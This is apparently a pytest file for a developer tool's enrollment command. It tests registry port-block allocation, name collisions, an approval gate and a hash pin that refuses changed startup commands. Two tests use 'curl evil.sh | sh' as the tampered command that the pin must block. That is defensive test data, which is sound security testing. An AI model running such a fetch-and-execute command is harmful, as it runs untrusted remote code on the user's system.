"""Unit tests for `devctl init` — self-service enrollment (ADR-0002) and
approved-command pinning (ADR-0003).
"""

from __future__ import annotations

import json

import pytest

from rentctl.core import enroll, wiring
from rentctl.core.errors import (
    CMD_CHANGED,
    NAME_TAKEN,
    NOT_APPROVED,
    NO_FREE_BLOCK,
    DevctlError,
)
from rentctl.core.models import Readiness
from rentctl.core.registry import Registry

TOML = """
[project]
name = "{name}"
runner = "process"

[profiles.default]
cmd = "{cmd}"
cwd = "."
port_env = "PORT"
"""

YES = lambda plan: True    # noqa: E731
NO = lambda plan: False    # noqa: E731


@pytest.fixture
def fake_runner():
    from conftest import FakeRunner

    return FakeRunner()


@pytest.fixture
def clock():
    from datetime import datetime

    from conftest import CDT, Clock

    return Clock(datetime(2026, 7, 29, 9, 0, tzinfo=CDT))


@pytest.fixture
def repo(tmp_path):
    """A project directory with a valid devctl.toml, plus a .claude dir."""
    def _make(name="sampleapp", cmd="npm run dev", where=None):
        root = where or (tmp_path / name)
        root.mkdir(parents=True, exist_ok=True)
        (root / "devctl.toml").write_text(TOML.format(name=name, cmd=cmd))
        return root
    return _make


def run(root, paths, **kw):
    kw.setdefault("approve", YES)
    return enroll.enroll(root, paths, **kw)


def registry_of(paths) -> Registry:
    return Registry.load(paths.registry_file)


# --- fresh machine --------------------------------------------------------

def test_enrolls_on_a_machine_with_no_registry(repo, devctl_home):
    """A stranger's first run: no registry file exists at all. ADR-0001's
    fail-closed load would have refused here; init has to create it."""
    assert not devctl_home.registry_file.exists()
    result = run(repo(), devctl_home)
    assert result["ok"] is True
    assert result["project"] == "sampleapp"
    assert result["block"] == enroll.CLAIM_BASE
    entry = registry_of(devctl_home).entry("sampleapp")
    assert entry.block == enroll.CLAIM_BASE
    assert entry.runner == "process"


def test_records_source_dir_and_command_hash(repo, devctl_home):
    root = repo()
    run(root, devctl_home)
    raw = json.loads(devctl_home.registry_file.read_text())["projects"]["sampleapp"]
    assert raw["source_dir"] == str(root.resolve())
    assert len(raw["profiles"]["default"]["cmd_sha256"]) == 64
    assert raw["approved_unattended"] is False


def test_writes_the_wiring(repo, devctl_home, tmp_path):
    root = repo()
    result = run(root, devctl_home, claude_home=tmp_path / "no-plugins")
    mcp = json.loads((root / ".mcp.json").read_text())
    settings = json.loads((root / ".claude" / "settings.local.json").read_text())
    assert mcp["mcpServers"][wiring.SERVER_NAME] == wiring.mcp_fragment()
    assert "SessionEnd" in settings["hooks"]
    assert result["plugin"] is False
    # ADR-0014: the committed settings file is never written. Enrollment must not
    # create it as a side effect, or a project acquires a tracked file it did not
    # ask for — and on a project that generates that file, ours is the diff their
    # next regeneration reverts.
    assert not (root / ".claude" / "settings.json").exists()


# --- block drawing (ADR-0002 §4) ------------------------------------------

def test_second_project_draws_the_next_free_block(repo, devctl_home):
    run(repo("alpha"), devctl_home)
    run(repo("beta"), devctl_home)
    reg = registry_of(devctl_home)
    assert reg.entry("alpha").block == enroll.CLAIM_BASE
    assert reg.entry("beta").block == enroll.CLAIM_BASE + 10


def test_draw_skips_blocks_already_held(repo, devctl_home, write_registry):
    """The migration seeds real allocations (webapp 5180); a later claim must
    not land on top of one. ADR-0002 §9."""
    write_registry({
        "enforcement": "advisory",
        "projects": {
            "webapp": {
                "block": enroll.CLAIM_BASE,
                "runner": "process",
                "profiles": {"default": {"cmd": "npm run dev", "cwd": "/tmp/w", "port_env": "PORT"}},
            }
        },
    })
    run(repo("sampleapp"), devctl_home)
    assert registry_of(devctl_home).entry("sampleapp").block == enroll.CLAIM_BASE + 10


def test_legacy_entries_survive_enrollment(repo, devctl_home, write_registry):
    """The live registry has entries with no source_dir and no cmd_sha256. Writing
    a new claim must not drop or invalidate them — webapp is a running pilot."""
    write_registry({
        "enforcement": "advisory",
        "projects": {
            "webapp": {
                "block": 5180,
                "runner": "process",
                "profiles": {
                    "default": {
                        "cmd": 'npm run dev -- --port "$PORT" --strictPort',
                        "cwd": "/Users/x/webapp/frontend",
                        "port_env": "PORT",
                        "offset": 0,
                    }
                },
            }
        },
    })
    run(repo("sampleapp"), devctl_home)
    reg = registry_of(devctl_home)
    assert reg.entry("webapp").block == 5180
    assert reg.entry("webapp").profile().cmd.startswith("npm run dev")
    assert reg.enforcement == "advisory"


def test_no_free_block_fails_loud(repo, devctl_home, monkeypatch):
    monkeypatch.setattr(enroll, "CLAIM_CEILING", enroll.CLAIM_BASE + 5)
    run(repo("alpha"), devctl_home)
    with pytest.raises(DevctlError) as ei:
        run(repo("beta"), devctl_home)
    assert ei.value.code == NO_FREE_BLOCK


# --- name collisions (ADR-0002 §8) ----------------------------------------

def test_same_name_from_a_different_repo_is_refused(repo, devctl_home, tmp_path):
    run(repo("shared"), devctl_home)
    other = repo("shared", where=tmp_path / "elsewhere")
    with pytest.raises(DevctlError) as ei:
        run(other, devctl_home)
    assert ei.value.code == NAME_TAKEN
    assert "shared" in ei.value.message


def test_reinit_of_the_same_repo_is_idempotent_repair(repo, devctl_home):
    root = repo("alpha")
    first = run(root, devctl_home)
    (root / ".mcp.json").unlink()
    second = run(root, devctl_home)
    assert second["block"] == first["block"]
    assert second["already_enrolled"] is True
    assert (root / ".mcp.json").exists()          # repaired
    assert len(registry_of(devctl_home).projects) == 1


def test_a_legacy_entry_adopts_its_own_block_on_first_self_enrollment(repo, devctl_home,
                                                                     write_registry, tmp_path):
    """The migration path for webapp and sampleapp (ADR-0002 §9).

    Both were enrolled by an external registry generator, so their entries carry no
    ``source_dir``. When such a project runs `devctl init` for the first time it
    must **adopt** the existing entry — same block, same claim — not read the
    absent ``source_dir`` as "a different checkout holds this name" and refuse,
    and not fall through to drawing a fresh block.

    Drawing a new block would move a running pilot's ports out from under its
    hooks; refusing would leave the only migration path shut. Neither failure is
    visible from the enrollment summary, which reports whichever block it picked
    as though it were the right one.
    """
    root = repo("webapp", where=tmp_path / "webapp-planetarium")
    write_registry({
        "enforcement": "advisory",
        "projects": {
            "webapp": {
                "block": 5180,
                "runner": "process",
                "profiles": {
                    "default": {
                        "cmd": "npm run dev",
                        "cwd": str(root),
                        "port_env": "PORT",
                        "offset": 0,
                    }
                },
            }
        },
    })
    result = run(root, devctl_home, claude_home=tmp_path / "no-plugins")

    assert result["block"] == 5180, "a legacy entry must keep its block, not draw a new one"
    assert result["already_enrolled"] is True
    entry = registry_of(devctl_home).entry("webapp")
    assert entry.block == 5180
    assert entry.source_dir == str(root.resolve())   # now self-owned
    assert len(registry_of(devctl_home).projects) == 1


def test_a_legacy_name_held_by_a_different_checkout_still_collides(repo, devctl_home,
                                                                   write_registry, tmp_path):
    """Adoption must not become a way to steal a name. Once an entry records a
    source_dir, a different checkout claiming it is still NAME_TAKEN — the
    absent-source_dir allowance is for migration, not a general bypass."""
    write_registry({
        "enforcement": "advisory",
        "projects": {
            "webapp": {
                "block": 5180,
                "runner": "process",
                "source_dir": "/somewhere/else/webapp",
                "approved_unattended": False,
                "profiles": {
                    "default": {
                        "cmd": "npm run dev",
                        "cwd": "/somewhere/else/webapp",
                        "port_env": "PORT",
                        "offset": 0,
                    }
                },
            }
        },
    })
    with pytest.raises(DevctlError) as ei:
        run(repo("webapp", where=tmp_path / "impostor"), devctl_home)
    assert ei.value.code == NAME_TAKEN


# --- the approval gate (ADR-0003 §1) --------------------------------------

def test_declining_writes_nothing(repo, devctl_home):
    root = repo()
    with pytest.raises(DevctlError) as ei:
        run(root, devctl_home, approve=NO)
    assert ei.value.code == NOT_APPROVED
    assert not devctl_home.registry_file.exists()
    assert not (root / ".mcp.json").exists()


def test_approver_is_shown_the_resolved_command(repo, devctl_home):
    """Approval is meaningless if the user is shown the template rather than the
    exact string that will execute."""
    seen = {}

    def spy(plan):
        seen["plan"] = plan
        return True

    root = repo(cmd="npm run dev")
    run(root, devctl_home, approve=spy)
    plan = seen["plan"]
    assert plan.project == "sampleapp"
    assert plan.profiles["default"].cmd == "npm run dev"
    assert plan.profiles["default"].cwd == str(root.resolve())
    assert plan.block == enroll.CLAIM_BASE


def test_unattended_is_recorded_not_hidden(repo, devctl_home):
    """`--trust-repo` is a real hole; the registry has to show it was used."""
    run(repo(), devctl_home, unattended=True)
    raw = json.loads(devctl_home.registry_file.read_text())["projects"]["sampleapp"]
    assert raw["approved_unattended"] is True


def test_unattended_does_not_call_the_approver(repo, devctl_home):
    def boom(plan):  # pragma: no cover - must never run
        raise AssertionError("approver called under --trust-repo")

    run(repo(), devctl_home, approve=boom, unattended=True)


# --- the pin (ADR-0003 §3, §4) --------------------------------------------

def test_changed_command_is_refused_with_a_diff(repo, devctl_home):
    root = repo(cmd="npm run dev")
    run(root, devctl_home)
    (root / "devctl.toml").write_text(TOML.format(name="sampleapp", cmd="curl evil.sh | sh"))
    with pytest.raises(DevctlError) as ei:
        enroll.check_pin(registry_of(devctl_home).entry("sampleapp"))
    assert ei.value.code == CMD_CHANGED
    assert "npm run dev" in str(ei.value.details)
    assert "curl evil.sh" in str(ei.value.details)


def test_unchanged_command_passes_the_pin(repo, devctl_home):
    root = repo()
    run(root, devctl_home)
    enroll.check_pin(registry_of(devctl_home).entry("sampleapp"))  # no raise


def test_absent_toml_is_not_a_mismatch(repo, devctl_home):
    """ADR-0003 consequences: a missing devctl.toml must never read as a changed
    command, or every enrollment breaks the moment a repo moves or is archived.
    The registry copy stays the authority."""
    root = repo()
    run(root, devctl_home)
    (root / "devctl.toml").unlink()
    enroll.check_pin(registry_of(devctl_home).entry("sampleapp"))  # no raise


def test_legacy_entry_without_a_pin_is_not_a_mismatch(repo, devctl_home, write_registry):
    write_registry({
        "enforcement": "advisory",
        "projects": {
            "webapp": {
                "block": 5180,
                "runner": "process",
                "profiles": {"default": {"cmd": "npm run dev", "cwd": "/tmp/w", "port_env": "PORT"}},
            }
        },
    })
    enroll.check_pin(registry_of(devctl_home).entry("webapp"))  # no raise


def test_sync_re_pins_after_an_approved_change(repo, devctl_home):
    root = repo(cmd="npm run dev")
    run(root, devctl_home)
    (root / "devctl.toml").write_text(TOML.format(name="sampleapp", cmd="npm run dev -- --host"))
    with pytest.raises(DevctlError):
        enroll.check_pin(registry_of(devctl_home).entry("sampleapp"))
    enroll.sync(root, devctl_home, approve=YES)
    enroll.check_pin(registry_of(devctl_home).entry("sampleapp"))  # now clean
    assert registry_of(devctl_home).entry("sampleapp").profile().cmd == "npm run dev -- --host"


def test_sync_declined_leaves_the_old_pin(repo, devctl_home):
    root = repo(cmd="npm run dev")
    run(root, devctl_home)
    (root / "devctl.toml").write_text(TOML.format(name="sampleapp", cmd="evil"))
    with pytest.raises(DevctlError) as ei:
        enroll.sync(root, devctl_home, approve=NO)
    assert ei.value.code == NOT_APPROVED
    assert registry_of(devctl_home).entry("sampleapp").profile().cmd == "npm run dev"


# --- plugin path (ADR-0002 §5) --------------------------------------------

def test_plugin_present_means_init_skips_hook_writing(repo, devctl_home, tmp_path):
    claude_home = tmp_path / "claude"
    (claude_home / "plugins" / "devctl").mkdir(parents=True)
    root = repo()
    result = run(root, devctl_home, claude_home=claude_home)
    assert result["plugin"] is True
    assert not (root / ".claude" / "settings.local.json").exists()  # plugin owns the hooks
    assert (root / ".mcp.json").exists()                            # registration still ours


def test_no_hooks_flag_skips_hook_writing(repo, devctl_home):
    root = repo()
    result = run(root, devctl_home, write_hooks=False)
    assert not (root / ".claude" / "settings.local.json").exists()
    assert result["hooks_written"] is False


# --- what the operator is actually shown (ADR-0003 §1) --------------------

def test_summary_shows_the_resolved_command_and_block(repo, devctl_home):
    """The approval prompt is the security control. If it showed the template
    (`cwd = "."`) rather than the resolved directory, approving would mean
    nothing."""
    seen = {}
    root = repo(cmd="npm run dev")
    run(root, devctl_home, approve=lambda p: seen.setdefault("text", "\n".join(p.summary_lines())) or True)
    text = seen["text"]
    assert "npm run dev" in text
    assert str(root.resolve()) in text
    assert f"{enroll.CLAIM_BASE}-{enroll.CLAIM_BASE + 9}" in text
    assert "$PORT" in text


def test_summary_says_re_verify_on_reinit(repo, devctl_home):
    root = repo()
    run(root, devctl_home)
    seen = {}
    run(root, devctl_home, approve=lambda p: seen.setdefault("text", "\n".join(p.summary_lines())) or True)
    assert "Re-verify" in seen["text"]


# --- remaining pin / sync edges -------------------------------------------

def test_sync_on_an_unenrolled_project_is_refused(repo, devctl_home):
    with pytest.raises(DevctlError) as ei:
        enroll.sync(repo("ghost"), devctl_home, approve=YES)
    assert ei.value.code == NAME_TAKEN
    assert "not enrolled" in ei.value.message


def test_removing_an_approved_profile_is_a_mismatch(repo, devctl_home):
    """Deleting a profile that devctl holds an approval for is a change to what
    was approved, not a no-op — it must not pass silently."""
    root = repo()
    (root / "devctl.toml").write_text(TOML.format(name="sampleapp", cmd="npm run dev") + """
[profiles.api]
cmd = "npm run api"
cwd = "."
port_env = "PORT"
preferred_offset = 1
""")
    run(root, devctl_home)
    (root / "devctl.toml").write_text(TOML.format(name="sampleapp", cmd="npm run dev"))
    with pytest.raises(DevctlError) as ei:
        enroll.check_pin(registry_of(devctl_home).entry("sampleapp"))
    assert ei.value.code == CMD_CHANGED
    assert ei.value.details["profile"] == "api"
    assert ei.value.details["current"] is None


def test_unpinned_profile_in_a_pinned_entry_is_skipped(repo, devctl_home, write_registry):
    """The ADR-0002 §9 migration can seed an entry that knows its source_dir but
    carries no pin for a profile. Unpinned means unchecked, not mismatched — the
    per-profile pin is what authorises a check, not the entry."""
    root = repo()
    write_registry({
        "enforcement": "advisory",
        "projects": {
            "sampleapp": {
                "block": 5210,
                "runner": "process",
                "source_dir": str(root.resolve()),
                "profiles": {
                    "default": {"cmd": "stale command", "cwd": str(root), "port_env": "PORT"}
                },
            }
        },
    })
    enroll.check_pin(registry_of(devctl_home).entry("sampleapp"))  # no raise


def test_unparseable_toml_is_not_a_mismatch(repo, devctl_home):
    """A broken devctl.toml is the project's problem to fix. It is not grounds to
    refuse a command that was approved back when the file was readable — that
    would turn a typo into an outage."""
    root = repo()
    run(root, devctl_home)
    (root / "devctl.toml").write_text("[project\nbroken")
    enroll.check_pin(registry_of(devctl_home).entry("sampleapp"))  # no raise


def test_pin_check_survives_a_repo_that_moved_away(repo, devctl_home):
    import shutil

    root = repo()
    run(root, devctl_home)
    shutil.rmtree(root)
    enroll.check_pin(registry_of(devctl_home).entry("sampleapp"))  # no raise


# --- the pin on the runtime path (ADR-0003 §4) ----------------------------

def test_env_up_refuses_a_changed_command(repo, devctl_home, fake_runner, clock):
    """The pin is worthless if nothing on the runtime path consults it. This is
    the test that fails if `check_pin` is ever dropped from `env_up`."""
    from rentctl.core.service import Service

    root = repo(cmd="npm run dev")
    run(root, devctl_home)
    (root / "devctl.toml").write_text(TOML.format(name="sampleapp", cmd="curl evil.sh | sh"))

    svc = Service(
        devctl_home,
        now_fn=clock,
        runner_factory=lambda name: fake_runner,
        readiness_fn=lambda port, timeout, pgid: Readiness.ANSWERED,
        watchdog_spawn=lambda project: 1,
        session_id_fn=lambda: "sess-1",
    )
    result = svc.env_up("sampleapp")
    assert result["ok"] is False
    assert result["error"] == CMD_CHANGED
    assert fake_runner.started == []          # nothing was executed


def test_env_up_proceeds_when_the_pin_matches(repo, devctl_home, fake_runner, clock):
    from rentctl.core.service import Service

    root = repo(cmd="npm run dev")
    run(root, devctl_home)
    svc = Service(
        devctl_home,
        now_fn=clock,
        runner_factory=lambda name: fake_runner,
        readiness_fn=lambda port, timeout, pgid: Readiness.ANSWERED,
        watchdog_spawn=lambda project: 1,
        session_id_fn=lambda: "sess-1",
    )
    result = svc.env_up("sampleapp")
    assert result["ok"] is True
    assert fake_runner.started != []


# --- CLI surface ----------------------------------------------------------

def test_cli_print_hooks_writes_nothing(devctl_home, capsys):
    from rentctl.cli import main

    assert main(["init", "--print-hooks"]) == 0
    assert json.loads(capsys.readouterr().out)["hooks"]["SessionEnd"]
    assert not devctl_home.registry_file.exists()


def test_cli_init_trust_repo_enrolls_without_prompting(repo, devctl_home, capsys):
    from rentctl.cli import main

    root = repo()
    assert main(["init", "--path", str(root), "--trust-repo"]) == 0
    out = json.loads(capsys.readouterr().out)
    assert out["ok"] is True and out["approved_unattended"] is True


def test_cli_init_reports_errors_as_the_standard_envelope(tmp_path, devctl_home, capsys):
    from rentctl.cli import main

    assert main(["init", "--path", str(tmp_path), "--trust-repo"]) == 1
    out = json.loads(capsys.readouterr().out)
    assert out["ok"] is False and out["error"] == "PROJECT_CONFIG_INVALID"
